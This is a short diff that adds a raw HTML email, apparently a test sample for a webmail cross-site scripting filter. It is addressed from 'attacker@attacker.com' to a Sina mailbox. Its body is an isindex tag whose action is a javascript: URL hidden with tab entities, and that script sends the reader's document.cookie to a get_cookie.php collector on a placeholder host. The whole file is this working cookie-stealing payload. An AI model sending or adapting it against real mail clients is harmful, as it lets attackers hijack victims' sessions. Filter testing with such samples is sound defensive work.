@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: wecome27694
+To: victim@sina.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<isindex prompt="This is a test:" action="j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:(new Image()).src='http://xxxx/get_cookie.php?cookie_store='+encodeURIComponent(document.cookie)" type=image>
